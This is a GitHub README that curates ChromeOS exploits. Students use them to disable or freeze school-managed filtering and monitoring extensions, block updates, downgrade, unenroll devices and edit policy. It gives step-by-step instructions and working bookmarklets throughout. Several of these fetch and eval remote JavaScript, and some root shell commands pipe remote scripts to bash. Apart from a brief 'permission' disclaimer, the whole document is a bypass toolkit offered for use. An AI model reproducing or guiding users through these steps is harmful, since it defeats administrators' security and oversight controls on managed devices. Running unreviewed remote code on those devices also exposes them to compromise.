# EXT-REMOVER
This is a curated list of exploits for ChromeOS. It started with LTBEEF, and now there is more! Many of these exploits can destroy your computer if misused. So PLEASE, PLEASE make sure you follow these instructions very carefully!

<b>Need help? Ask for help <a href="https://github.com/3kh0/ext-remover/discussions">here</a>!</b>

Please use these only when you have permission, I (3kh0) do not condone the use of any exploits for illegal purposes!

<img width="250px" src="https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png">

Image Credit: LittleMissNyan

Thank you to all of the contributors! Yall really are pretty epic :D

<a href="https://github.com/3kh0/ext-remover/graphs/contributors"><img src="https://contrib.rocks/image?repo=3kh0/ext-remover" /></a>

- [EXT-REMOVER](#ext-remover)
  * [GuardianTabCrash *Unrestricted browsing*](#guardiantabcrash-unrestricted-browsing)
  * [Skiovox *Unrestricted browsing*](#skiovox-unrestricted-browsing)
  * [LTBEEF *Disable extensions*](#ltbeef-disable-extensions)
  * [LoMoH *Disable extensions*](#lomoh-disable-extensions)
  * [LTMEAT *Disable extensions*](#ltmeat-disable-extensions)
  * [LTMEAT Flood *Freeze extensions*](#ltmeat-flood-freeze-extensions)
  * [Temp TMEAT *Freeze extensions*](#temp-tmeat-freeze-extensions)
  * [Baby LTMEAT *Freeze extensions*](#baby-ltmeat-freeze-extensions)
  * [LTMEAT Print *Freeze extensions*](#ltmeat-print-freeze-extensions)
  * [Dextensify *Disable extensions*](#dextensify-freeze-extensions)
  * [JPCMG *LTBEEF w/ Service workers*](#jpcmg-ltbeef-w--service-workers)
  * [Corkey *Corrupt extensions*](#corkey-corrupt-extensions)
  * [Extension Launcher *Install extensions w/o allowlist*](#extension-launcher-install-extensions-w-o-allowlist)
  * [Point-Blank *Execute scripts on extension pages*](#point-blank-execute-scripts-on-extension-pages)
  * [UBoss *Tamper with IBoss*](#uboss-tamper-with-iboss)
  * [CAUB *Prevent Updates*](#caub-prevent-updates)
  * [CAUB Flags *Prevent Updates*](#caub-flags-prevent-updates)
  * [Blank3r](#blank3r)
  * [SH1MMER *Unenrollment*](#sh1mmer-unenrollment)
  * [Downgrading *Change versions*](#downgrading-change-versions)
  * [Pollen *Policy Editor*](#pollen-policy-editor)
  * [Killcurly *Break extensions*](#killcurly-break-extensions)
  * [Shimboot *Boot Linux*](#shimboot-boot-linux)
  * [uBlock Run *Run Code On Pages*](#ublock-run-run-code-on-pages)
  * [uRun - Bypass bookmarklet restrictions with ublock](#urun---bypass-bookmarklet-restrictions-with-ublock)
  * [Quick View *Bypass extensions*](#quick-view-bypass-extensions)
  * [Buypass *Bypass extensions*](#buypass-bypass-extensions)
  * [Chaos *Hapara bypass*](#chaos-hapara-bypass)
  * [SOT Exploit *OneTab bypass**](#sot-exploit)
  * [GoGuardian GoAway *GoGuardian bypass*](#goguardian-goaway-goguardian-bypass)
  * [Microsoft Labs](#microsoft-labs-virtualbox-but-it-got-20-doses-of-the-covid-vaccine*)

<small><i><a href='http://github.com/3kh0/readme-toc/'>Table of contents generated with readme-toc</a></i></small>

## GuardianTabCrash *Unrestricted browsing*

### What is it?

An exploit that allows for unrestricted internet access outside of goguardian's control

### How to use it?

**Teacher's can still see your screen, but they can't block or close any of your tabs.**

**YOUR TEACHER NEEDS TO HAVE SET A TAB LIMIT. TRY OPENING TONS OF TABS TO CONVINCE THEM TO ENABLE TAB LIMITS**.

1. create a bookmark named anything: `javascript: window.onbeforeunload = ()=>{return false;}`
2. Hold down CTRL and then SPAM CLICK the bookmark until you're well above the tab limit, opening a bunch of `about:blank` pages.
3. It might ask if you want to leave this page, this is goguardian trying to close it. Say No, and click `Prevent from creating additional dialogues`.
4. Enjoy your unblocked stay!

#### Discovered by @py660


[**🔼 Back to top**](#ext-remover)

## Skiovox *Unrestricted browsing*

### What is it?

An exploit that allows for browsing within a completely unblocked Chrome
browser. It works on ChromeOS 118 and a wide range of previous versions.
- Skiovox utilizes a bug in kiosk apps
- Very similar to a bug from 3 years ago
Within the unblocked browser, you can
- Install extensions
- Bypass pretty much all blocks
- Do whatever the honk you want

### How to use it

Bypassi made a wonderful slideshow for you goofballs to follow and view using any of the links below!

- https://www.skiovox.com/skiovox.pdf
- https://drive.google.com/file/d/1tl8eP26MFRejHO38H5HwMLl2VaQrtn0Z/preview
- https://ftp.3kh0.net/Archive/skiovox.pdf
- https://1drv.ms/b/s!Ais5N3vPLTEMh8poZbywnNWdMUrhUA?e=MaCHBx
- [`img/skiovox.pdf`](img/skiovox.pdf)

### Further Reading
- [Skiovox helper](https://github.com/bypassiwastaken/skiovox-helper)

[**🔼 Back to top**](#ext-remover)

## LTBEEF *Disable extensions*

LTBEEF (Literally The Best Exploit Ever Found) is an exploit found by Bypassi (Bypassi#7037) in September 2022 and is a great way to disable spyware installed on your Chromebook by your school.

### How to use LTBEEF

Use either of the two bookmarklets below. The instructions are the same for both.

1. Copy the Javascript code from either of the two bookmarklets below
2. Make a new bookmark on your Chromebook
3. Put the Javascript code in the URL section of the bookmark
4. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
5. If that page does not work, you can just change the end of the URL to anything else, like https://chrome.google.com/webstoreYAAAAAAAAAAAAAAAY
6. Click on the bookmark you made
7. Switch off the extensions you don't want to have anymore.
8. You're done! The extension should now be disabled. 

**Please note that this exploit has been patched for quite some time**

### Bookmarklets

#### CompactCow GUI

![compactcowgui](img/compactcow.png)

```js
javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
```

#### Ingot

![ingot](img/ingot.png)

```js
javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
```

[**🔼 Back to top**](#ext-remover)

## LoMoH *Disable extensions*

Formerly named "Locked Mode Hack," this Chrome OS exploit uses the locked mode feature to soft disable force-enabled extensions on managed accounts (Excluding Hapara Highlights and Read&Write if installed).

**This exploit is patched in Chrome OS 111**

### Bookmarklet Version (Original and nicer)
```
javascript:(function(){if (location.hostname == "docs.google.com") {document.body.innerHTML = document.body.innerHTML.replace("Locked mode is on", "Are you ready to turn off extensions?%22);%20document.body.innerHTML%20=%20document.body.innerHTML.replace(%22You%20have%20already%20opened%20and%20closed%20this%20quiz.%20Opening%20this%20quiz%20again%20will%20notify%20the%20form%20owner%20by%20email.%22,%20%22This%20will%20reload%20all%20tabs%20in%20your%20browser%22);%20var%20button%20=%20document.getElementById(%27mG61Hd%27);%20button.innerHTML%20=%20button.innerHTML.replace(%22Start%20Quiz%22,%20%22Disable%20Extensions%22);%20button.addEventListener(%27click%27,%20function(event){window.close();})}%20else%20{window.open(%22https://docs.google.com/forms/u/0/d/e/1FAIpQLSf5EYwrSUjmQhBOasMpORZy80eBCYb7qCpEwWNoRPUGyObGMA/startquiz%22);}})()
```

### Website/HTML Version (for blocked bookmarklets)
[LoMoH HTML](https://ashtondavies.github.io/LoMoH?unlock)
**Additional Notes:**
You must create your link with the button on the page for locked mode to work within your organization/district.
If this is patched for you, you will get rickrolled attempting to perform this exploit. This is just a heads-up for those who do happen to read this.

[GitHub Repository](https://github.com/AshtonDavies/LoMoH)

[**🔼 Back to top**](#ext-remover)

## LTMEAT *Disable extensions*

**L**iterally **T**he **M**eatiest **E**xploit of **A**ll **T**ime

1. Find a page belonging to the extension you want to disable. `chrome://extensions`, `chrome://extensions-internals`, and `chrome://process-internals` are all good places to find your extension's ID (a 32-character lowercase string). You can also do a simple Google search. Once you have your ID, substitute it into the hostname in the URL below:

```
chrome-extension://extensionidhereblahblah/manifest.json
```

For some filters like Securly, the block screen is already an extension page. 

2. Bookmark the extension page (bookmark A) if you wish. Then, bookmark `chrome://kill` (B) and `chrome://hang` (C). 
3. On the extension page (A), click the `chrome://kill` bookmark (B). The page should crash. You should already have the next step prepared. 
4. Instantly start spamming `chrome://hang` (bookmark C) and quickly reload the page while spamming (ideally with the refresh key on your keyboard or `ctrl`+`R`). You should have reloaded within one or two seconds of killing the page. 
5. If the extension page (bookmark A) no longer loads, then LTMEAT worked! You can close your tabs, and the extension will be dead. If nothing loads, you probably reloaded too late or spammed too slowly. This isn't rocket science! Restart your computer to revert back to normal. 

Exploit made by [Bypassi#7037](https://buymeacoffee.com/bypassi), [learn why this works](https://ltmeat.bypassi.com).

### "Help me! I'm an idiot!"

I had far too much faith in society when making this page. Some of you skids out there are really, really stupid and also can't read. So here are the answers to some commonly asked questions. 

**How do I get an extension ID?**

Okay, fair. Extension IDs are leaked in a couple of places. Generally, the best way to get them is to go to extension settings and copy the URL query value.

**It says blocked by client?**

That's the message you get when you try to visit a page belonging to an extension that doesn't exist. The error message (`ERR_BLOCKED_BY_CLIENT`) is highly misleading. Nobody blocked it. You need to find the correct extension ID (see above).

If you got this because you tried to visit the `extension_id_here` example URL, you should be extremely ashamed of yourself. Please change and grow as a person.

**I don't have a bookmarks bar!!!!**

First, try running ctrl+shift+B. If that doesn't work, go to `chrome://settings` and turn on the "home button" feature, then set it to `chrome://hang`. A home icon in the top left should appear to the right of your refresh icon. Use that instead of bookmark C.

There is a version where you don't need bookmarklets, but I am currently gatekeeping it (L). Check this site daily to see if new alternate instructions have been posted. 

**I disabled an extension, but now I can't load websites!**

If you just read the write-up, you'd know this would happen if the extension's background page loaded and its listeners were already initialized before you used `chrome://hang`. You can double-check whether the extension is listening using `chrome://extensions-internals`, assuming you have a few brain cells in your head.

Anyway, no listeners mean you were too slow. Either you waited more than three seconds between bookmark B and reloading the page, or you needed to be spamming bookmark C faster. The most reliable fix is to restart your computer and try again. Try to match the pace of the gif below: (note the reload) 

![image](img/abc.gif)

**The bookmarks don't do anything when I click them!**

Might be admin-blocked. Either be smart enough to figure out another way or check this site daily to see if new alternate instructions have been posted.

**I disabled the extension. Why is some stuff still blocked?**

I have bad news for you... not all filters are Chrome Extensions. Again, make sure the extension pages (like bookmark A) are frozen before you assume that your skiddy self successfully did the exploit. 

[Baby method for slow people](https://ltmeat.bypassi.com/alt/1.txt)

[**🔼 Back to top**](#ext-remover)

## LTMEAT Flood *Freeze extensions*

1. Create a bookmark folder and paste the extension page many times. (About 800 minimum is recommended, assuming your Chromebook is average school quality) You should add the extension page at the beginning of the folder.
2. Right-click and open all in a new window.
3. Close the window with all those tabs.
4. Open the folder in a new window again, and Chrome should hang those tabs to take care of the old ones in the background that were just closed. (Equivalent to the duplicate tab step in Bypassi's method)
5. Flip the Allow access to file URLs switch in the extension settings, and then you've bypassed the patch, and the exploit is working.

Close everything and you're good to go. If it didn't work, try adjusting the number of open tabs. This is the LTMEAT Flood Method, and also unofficially called Alternate Method # 2. Enjoy a much longer life of LTMEAT!

**Not working?** Ensure you open a large set, but not too large, of extension tabs (_/generated_background_page.html or /manifest.json) for a permanent freeze.

[**🔼 Back to top**](#ext-remover)

## Temp TMEAT *Freeze extensions*

A method of using LTMEAT that does not require `chrome://` URLs. This works by using 80-150 tabs to soak up memory.

1. Create a bookmark with the link `chrome://extensions/?id=extension_id_here` and name it `Kill switch`.
2. Create a new bookmark folder. Name it `spam.js`. Next, paste this link into your browser: `chrome-extension://extension_id_here/background.js`
3. Then right-click on your folder and hit `Add Page`. Press Enter.
4. Right-click on the folder again and hit `Bookmark Manager`. You should see your page. Click on it and hit `Ctrl`+`C`. Press `Ctrl`+`V` until you have 38 of them.
5. Go to a new tab and right-click your folder. Press `Open All (38)`.
6. Repeat step 3, then click on one of the tabs from this batch. Wait until the `This page is taking too long` popup appears. This will take 30-60 seconds. If it doesn’t, do `chrome://restart` and go back to step 2. Add 3-4 more pages to the folder.
7. Once the popup happens, right-click on one of the tabs closest to the right of the screen and hit `Duplicate`. Then, go to your `Kill switch` bookmark and look for a switch to flip, `Allow Access to File:// urls`. Then, click on the leftmost extension tab (one that opened from the main.js folder) and click `Close all tabs to the right`. KEEP THIS TAB OPEN!!!

Tips: Go to `chrome://settings/performance` and turn Memory Saver off, and in the box where it says `Keep these sites always active`, paste in the extension URL. I’ve noticed clicking on one of the tabs from the second batch seems to help with reliability.

[**🔼 Back to top**](#ext-remover)

## Baby LTMEAT *Freeze extensions*

BABY METHOD
FOR THE TECHNOLOGICALLY CHALLENGED.

1. Follow step one of the original instructions to find a page belonging to the Chrome extension you want to disable.
2. Visit that `chrome-extension://extension_id_here` page, then type `chrome://hang` in the URL bar of that tab. It should start loading infinitely.
3. Right-click the tab and duplicate it. Don't close anything.
4. Go to the `chrome://extensions` page for the blocker extension you want to Disable.
5. If that page has any switch, such as `Allow access to file URLs`, click that switch. If you don't see any clickable switches, this exploit will not work
6. The extension should now be broken, assuming you clicked the switch! Only one of the two duplicate tabs should be left standing. You can close your tabs now.

[**🔼 Back to top**](#ext-remover)

## LTMEAT Print *Freeze extensions*

1. Find your extension's largest file. This can usually be found by using [Rob Wu's crxviewer](https://robwu.nl/crxviewer/)
2. Go to that page and run `Ctrl`+`P`. A print window should show up, with several pages in the top right.
3. Do everything you can to increase that number. Shrink down margins, change layout to landscape, anything you can. The higher you get that number, the longer the effect will last.
4. Reload. The page should start hanging.
5. Go to your extension's settings page, `chrome://extensions`.
6. Duplicate your "printing" tab, and go back to your extension's settings page.
7. Flip any switch you can find there. Usually, there'll be one titled `Allow access to file URLs`.

### Where do I find my extension's manifest.json?
First, find your extension's ID. This is a 32-character code found on your extension's settings page, normally near or at the top. 

![Where do I find my extension ID](img/find_ext_id.png)

Then go to `chrome-extension://extension_id_here/manifest.json`

Credit to Bypassi for the original LTMEAT framework, and to Swordmaster4321 for discovering that pages can be hung with printing.

[**🔼 Back to top**](#ext-remover)

## Dextensify *Freeze extensions*

Dextensify is an exploit that lets you disable most admin-installed Chrome extensions from any webpage. It can be used from regular websites, HTML files, and data URLs.

Go here and follow instructions: <a href="https://dextensify.pages.dev/main">Dextensify Main HTML</a>, or download the file here [Dextensify.html](Dextensify.html)

Download mirror: [ftp.3kh0.net](https://ftp.3kh0.net/Archive/Dextensify/)

Made by <a href="https://ading.dev/">ading2210</a>

[**🔼 Back to top**](#ext-remover)

## JPCMG *LTBEEF w/ Service workers*

**Requirements**
- `chrome://serviceworker-internals`
- Inspect element

1. Go to `chrome://serviceworker-internals`
2. Find your extension, this exploit will not work if you can't find it. Some extensions will not work with this exploit.
3. Hit the start button then the `Inspect` button, and execute the LTBEEF code
```js
chrome.management.setEnabled('extension_id_here',false)
```

![Screenshot example](img/jpcmg.png)

Thanks to Nyaann#3881 for this exploit

[**🔼 Back to top**](#ext-remover)

## Corkey *Corrupt extensions*

Corkey does indeed include power washing the Chromebook, which wipes local data including everything under "My files," so I suggest you select everything you want to drag and back up to Google Drive if that's available for your account.

1. Esc+Refresh+Power and re-enroll (Enter recovery page), or you can just powerwash.
2. Log into your Chromebook and immediately turn off WiFi and do refresh+power to (instant restart)
3. Log back into your Chromebook with the WiFi off. Look for an option to log in as an existing user and click that.
4. Go to `chrome://extensions`, turn on WiFi, and wait for your school's blocking extension to appear.
5. As soon as it appears, turn off WiFi and restart as fast as possible.
6. Log back in, go back to extensions, and wait. If it says your blocking extension could be corrupted or doesn't appear at all, then it worked (wait at least a minute with a close watch in case it comes back)
7. If it didn't work, start over. You have to be fast.

[**🔼 Back to top**](#ext-remover)

## Extension Launcher *Install extensions w/o allowlist*

A bookmarklet capable of installing extensions, for those without an allowlist.

### Requirements
1. Access to the Chrome Web Store
2. A Chromebook without allowlist
3. Bookmarklets enabled

### Instructions

1. Go to [`ext-launcher-bookmarklet.js`](ext-launcher-bookmarklet.js) and save the code as a bookmarklet.
2. Go to [The Chrome Webstore](https://chrome.google.com/webstorex) and use the bookmarklet
3. Then put the icon of the extension, the ID, and the name of it (This does not matter, you can put anything), then press download, and it will work.

### Extra Notes
- Credit to "Aka, but nice" on Discord.
- DNS will be up soon for those who have JavaScript bookmarklets blocked.
- This will not work if you have a blocklist this is only for if when you go to the web store it shows blocked

[**🔼 Back to top**](#ext-remover)

## Point-Blank *Execute scripts on extension pages*

This exploit allows you to execute scripts on extension pages, this is a great example of how Chromebooks are a piece of garbage.

### Requirements
1. Bookmarklets enabled
2. Access to a working brain

### Getting started

1. Go to [`newpointblank.js`](newpointblank.js) and save the code as a bookmarklet on your Chromebook.
2. Now find your blocker from the list below.

### Blockers

#### Securly

[Go to this page](https://tinyurl.com/bettergoofcurly)

If it says blocked by Chrome, reload (you have to actually have Securly ofc)

#### iBoss

[Go to this page](https://tinyurl.com/goofboss)

#### Cisco Umbrella

[Go to this page](https://tinyurl.com/goofumbrella)

#### Blocksi

[Go to this page](https://tinyurl.com/goofsi)

#### GoGuardian

[Go to this page](https://tinyurl.com/goofguardian)

If your school updated GoGuardian, this exploit may not work.

### Extra Notes

- Now most of these links are a block page (this is intentional) 
- Each page should have a blue link, click the link on the page if it opens a blank page click the bookmarklet that you just made 
- Click either hard disable or soft disable, soft disable will only disable it until you restart your Chromebook.
- You can also run some of the scripts and run your own code, your extension may disable javascript running on it, so running your own code may not work.
- I recommend doing soft disable, which only disables it until restart. 
- The idea was from <a href="https://bolg.glitch.me/_/point-blank/">Bypassi#7037</a>

[**🔼 Back to top**](#ext-remover)

## UBoss *Tamper with IBoss*

This works only for iBoss, and Blocksi, If you don't have one of these, use New Point Blank.

### Requirements
- Bookmarklets enabled
- Access to a working brain

### Getting started
1. Go to the corresponding link for your blocker below.

iBoss: [tinyurl.com/byeswamp](https://tinyurl.com/byeswamp)

Blocksi: [tinyurl.com/blockboss](https://tinyurl.com/blockboss)

Then bookmark the code below:

```js
javascript:opener.eval(`fetch("https://rounded-boiling-flax.glitch.me/uboss.js").then(data=>{data.text().then(e=>{eval(e)})})`) && close();
```
2. Then go to the site with your blocker that was listed above.
3. Run the code. Follow the instructions there.

If it doesn't work let us know by creating a discussion, this was made in partnership with `akabutnice` and `bypassi`.

[**🔼 Back to top**](#ext-remover)

## CAUB *Prevent Updates*

This exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by Catakang#0987. Using onc files, you can convince your Chromebook that the WiFi that you're connected to is pay-to-use (like a hotspot using data), and thus it will not check for updates.

### Requirements
- Access to `chrome://network#state`

### Getting started
1. Go to `chrome://network#state`.
2. Scroll to the bottom of the page. You will see a list of WiFi that you have connected to before.
3. Click the `+` sign next to the WiFi name of each network that you commonly connect your Chromebook to.
4. We are going to make it so that when the Chromebook is connected to those networks, it will not check for updates.
5. Use ctrl+a and ctrl+c to copy all the text on the entire network#state page.
6. Go to [caub.glitch.me](https://caub.glitch.me/).
7. Paste the copied text into the textbox below.
8. Press the `generate onc` button below the textbox.
9. Once you have downloaded the file, go to `chrome://network#general`.
10. Click on the `import ONC` button.
11. Import the newly downloaded file.

**Extra notes**
- Your Chromebook will no longer automatically update. (as long as you are on a wifi that you CAUBed)
- Be careful not to stay on wifi for too long without using CAUB on it, otherwise, you might update.
- We cannot guarantee that this will work on every wifi, but it should work on most.

[**🔼 Back to top**](#ext-remover)

## CAUB Flags *Prevent Updates*

This alt exploit keeps your Chromebook downgraded (or on the current version) without automatic updates screwing you over. This exploit was found by <a href="https://github.com/MechaXYZ">MechaXYZ</a>. Using a Chrome flag, you can convince your Chromebook not to automatically update.

### Requirements
- Access to `chrome://flags`

### Getting started

1. Go to `chrome://flags#show-metered-toggle` or search "metered" in `chrome://flags` instead.
2. Enable it and restart your device.
3. Open the Settings app.
4. Go to your Network >> Advanced >> Show metered toggle and turn it on

**Extra notes**
- Your Chromebook will no longer automatically update. (as long as you have the flag enabled)
- And you must be able to enable flags if it ain't blocked otherwise, this exploit won't work

[**🔼 Back to top**](#ext-remover)

## Blank3r

Blank3r is an exploit that allows you to run bookmarklets on privileged pages, such as the Chrome extensions page. This exploit was made with Point Blank as well.

### Requirements
- Bookmarklets enabled

### Getting started
1. Bookmark this code:

```js
javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 145);
```
2. Navigate to `chrome://extensions`.
3. Click on an extension that YOU installed from the Chrome Web Store > Details.
4. In the URL bar, copy the string of letters and numbers after the `/?id=`.
5. Click "View in Chrome Web Store" and spam the escape key. If it loads into Chrome Webstore try again, if it is a blank screen click the bookmarklet.
5. Paste the ID of the extension into the prompt separated by commas.

If you close the tab, the exploit will stop working.

[**🔼 Back to top**](#ext-remover)

## SH1MMER *Unenrollment*

SH1MMER is an exploit capable of completely unenrolling enterprise-managed Chromebooks. It was found by the Mercury Workshop team and was released on January, Friday the 13th, 2023.

Due to the detail this exploit requires, please check out the offical website: [sh1mmer.me](https://sh1mmer.me)

**This exploit has been patched since Chrome OS 111.**

### Further Reading
- [Repository](https://github.com/MercuryWorkshop/sh1mmer)  
- [Official Website](https://sh1mmer.me/)
- [Writeup](https://blog.coolelectronics.me/breaking-cros-2/)

[**🔼 Back to top**](#ext-remover)

## Downgrading *Change versions*

Downgrading can be used for several exploits, to get to a version that does not have patches for certain exploits, such as LTBEEF. This is a built-in feature of ChromeOS.

Please do note that recently, they have patched downgrading on most devices up to a certain version., so this may not work for you.

### Requirements
- A USB thumb drive with at least 4GB of storage, some boards have small or bigger images, I recommend 16GB
- A personal computer with access to downloading extensions

### Setup

1. Navigate to `chrome://version` on the Chromebook you wish to downgrade. If that is blocked try `chrome://system/:~:text=CHROMEOS_RELEASE_DESCRIPTION`, and check for your board under `Platform`. For me, that would be octopus.

![chrome://version](img/chromeos-check-board.png)

2. Navigate to [chrome100.dev](https://chrome100.dev/) , press `ctrl+f` and type in your board.
3. Find and download the Chrome version you want to your personal computer.

### Downgrading
1. Install [Chromebook Recovery Utility](https://chromewebstore.google.com/detail/chromebook-recovery-utili/pocpnlppkickgojjlmhdmidojbmbodfm) onto your personal computer.
2. Open the extension, click on the settings button in the top right-hand corner, and click "Use local image".
3. Select the recovery image you downloaded from chrome100.
4. Plug in the USB you wish to use, and follow the prompts on the screen.
5. On your Chromebook, press esc+reload+power and follow the prompts.
6. On the checking for updates screen, press `ctrl`+`shift`+`e` to skip the "checking for updates" screen.

[**🔼 Back to top**](#ext-remover)

## Pollen *Policy Editor*

chromeOS User Policy Editor

### Requirements
- Devmode **NEEDS** to be enabled.

### Getting started

There are two modes for this, I recommend just using the first one.

#### Normal

1. Open Crosh (Ctrl+Alt+T)
2. Run the following commands:
```sh
shell
sudo su
curl -Ls https://mercuryworkshop.github.io/Pollen/Pollen.sh | bash
```
3. Done! It may take a few seconds for the new policy to apply. If it does not apply, press `alt+vol_up+x`.

#### PollenFS (RootFS)

Disabling RootFS **will** Soft-Brick your Chromebook when booting back into normal mode.

1. Open Crosh (Ctrl+Alt+T)
2. Run the following commands:
```sh
shell
sudo su
curl -Ls https://mercuryworkshop.github.io/Pollen/RootFS.sh | bash
```
3. Reboot
4. Go Through Steps 1-3 Again
5. Run the following command:
```sh
curl -Ls https://mercuryworkshop.github.io/Pollen/PollenFS.sh | bash
```
6. Done! Your Pollen configuration is now permanently applied!

### Further Reading
- [Repository](https://github.com/MercuryWorkshop/Pollen)

[**🔼 Back to top**](#ext-remover)

## Killcurly *Break extensions*
Kill the extension by signing out.

1. Visit `chrome://settings/signOut`.
2. Press the big blue button.
3. Go to `chrome://restart`
4. Now visit `tinyurl.com/AddSession` or [this link](https://accounts.google.com/signin/v2/identifier?hl=en&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&flowName=GlifWebSignIn&flowEntry=AddSession)
5. Add your **SCHOOL** account back. It WILL NOT WORK if you add a home account back. This is just so you can still access Google Drive, YouTube, and any Google service.
6. All extensions should stop working.
7. Note that you must repeat this every time you restart or sign out.
8. If your Chrome version is v112 or above, this exploit will no longer work, the bypass to this is listed further on.

Credit to Zoroark

[**🔼 Back to top**](#ext-remover)

## Shimboot *Boot Linux*

Shimboot is a collection of scripts for patching a Chrome OS RMA shim to serve as a bootloader for a standard Linux distribution. It allows you to boot a full desktop Debian install on a Chromebook, without needing to unenroll it or modify the firmware.

For more detailed information, please see the project's [README](https://github.com/ading2210/shimboot).

Credit to [vk6](https://ading.dev/) for this exploit

### Further reading
- [Repository](https://github.com/ading2210/shimboot)
- [Project Website](https://shimboot.ading.dev/)

[**🔼 Back to top**](#ext-remover)

## uBlock Run *Run Code On Pages*

If your school allows the uBlock Origin chrome extension, then running any bookmarklet is possible.

### Requirements
- uBlock Origin

### Getting started
1. Make sure you have [uBlock Origin](https://chromewebstore.google.com/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm) installed.
2. Go to the extension's settings
3. Under the settings tab, check the "I am an advanced user" box, then click on the small cog icon.
4. Find `userResourcesLocation` and change it from `unset` to `https://raw.githubusercontent.com/3kh0/ext-remover/main/ublockExec.js`

5. Goe My filters tab of the settings and add the following line:
```
*##+js(execute_script.js)
```
6. Now press ctr+alt+tilde (~) to run code on the current page
7. Have fun!

[**🔼 Back to top**](#ext-remover)

## uRun - Bypass bookmarklet restrictions with uBlock
From [Inglan2](https://github.com/Inglan2)

Recently Google cracked down on bookmarklets and now they don't work (Its based on the [DeveloperToolsAvailability](https://chromeenterprise.google/policies/?policy=DeveloperToolsAvailability) policy). I wanted to run scripts still so I started making this, inspired by [uBlock Run *Run Code On Pages*](#ublock-run-run-code-on-pages), but with more features, like saving scripts.
1. Open uBlock settings
2. Enable advanced settings, and click the gear ⚙️ button

> [!CAUTION]
> DO MODIFY ANYTHING ELSE ON THIS PAGE, UNLESS YOU KNOW WHAT YOU ARE DOING (you probably don't), AS YOU COULD BREAK SOMETHING.

> [!TIP]
> If you mess up, go to the home of settings and at the bottom click reset to default settings

3. Add the script
> Change
> ```
> userResourcesLocation unset
> ```
> to
> ```
> userResourcesLocation https://inglan2.github.io/uRun/urun.js
> ```

> [!TIP]
> It's down the bottom
4. Set a filter to load uRun
> After closing the advanced settings tab, go to the filters tab and add this:
> ```
> *##+js(urun.js)
> ```

### Usage
Simply press Ctrl + Shift + \` to open the menu and from there you can run and create scripts. To add a script, press the ➕ button up the top right, and enter the code you would like to add (without the `javascript:` part).

[**🔼 Back to top**](#ext-remover)

## Quick View *Bypass extensions*

QuickView is a universal webview exploit in Chrome OS that utilizes the QuickOffice component extension. This exploit lets you create login windows with arbitrary URLs, thus allowing you to load pages without any extensions.

Go to <a href="https://quickview-exploit.pages.dev/">quickview-exploit.pages.dev</a> and follow the instructions

Please note that you need to be able to run bookmarklets for this exploit to work.

### Further reading
- [Writeup](https://ading.dev/blog/posts/quickview.html)
- [Repository](https://github.com/ading2210/quickview)

[**🔼 Back to top**](#ext-remover)

## Buypass *Bypass extensions*

### What it can and can't do

- This only lasts for 3 minutes!
- Pages visited in this window will not be saved to your history, but their cookies will be saved.
- You can right-click on the window to go back and forward.
- There's no good way to make the text in the window larger.
- This won't bypass network filters.
- You can't log into non-school accounts.
- It's completely possible that some filters could read and block the data sent within the window.

### Getting started

Visit any of the links below:
- https://buypass.bypassi.com
- https://buypass.brandonprather.repl.co
- https://buypass.glitch.me
- https://buypass.netlify.app

### Further reading
- [Repository](https://github.com/bypassiwastaken/buypass)

[**🔼 Back to top**](#ext-remover) 

## Chaos *Hapara bypass*

**Devtools must not be blocked by policy to perform this exploit.**

Go to <a href="https://xlak.github.io/chaos/">this link</a> and follow instructions

### Further Reading:
- [Repository](https://github.com/xlak/chaos)

[**🔼 Back to top**](#ext-remover)

## SOT Exploit *OneTab bypass*

1. Download this extension [One Tab](https://chromewebstore.google.com/detail/onetab/chphlpgkkbolifaimnlloiipkdnihall)
2. Click the import button in the settings tab.
3. Copy-paste the URL you wish to visit about 100 times, and then click import.
4. Spam click the top link, then either spam escape on one of them or wait for one to load on a about:blank page.
  
Credit to [Coding4Hours](https://github.com/Coding4Hours)

[**🔼 Back to top**](#ext-remover)

## GoGuardian GoAway *GoGuardian bypass*

No idea whatsoever how this went through

THIS EXPLOIT WILL NOT WORK FOR YOU IF YOU HAVE ANY OTHER EXTENSION BESIDES GOGUARDIAN

### Getting Started
1. Obviously (but still needs to be said due to skids), make sure GoGuardian is actually installed
2. Visit the [attached URL](goaway.txt) in a new tab
3. On that tab there will be a simple white screen with nothing on it, reload the page
4. If the GET request fails and you are left on an error screen (don't panic, this is intended, continue)
5. Visit `chrome://restart`` to clear cached sites from GoGuardian

Credit to akabutnice

[**🔼 Back to top**](#ext-remover)

## Microsoft Labs *Virtualbox but it got 20 doses of the COVID Vaccine*

This exploit cos removed in "The Great Reformatting of 2023" so I am gonna readd it!!!
Thanks a bunch Bill Gates

**Do this! Not drugs!**
1. Go to this website [Microsoft Labs](https://learn.microsoft.com/en-us/training/modules/implement-common-integration-features-finance-ops/10-exercise-1)
2. click that button thay say "Sign in to launch VM mode"
3. Holy guacamole! You need a Microsoft Account! Use your credentials and sign in.
4. Load the virtual machine by clicking the button or if you sign it it will redirect you to it automatically.
5. The password is pass@word1
6. Profit

NOTES: sound doesn't work, a lot of websites are blocked, but its just fun to screw around in it.

(Not really) credit to mundaneunblocking

[**🔼 Back to top**](#ext-remover)
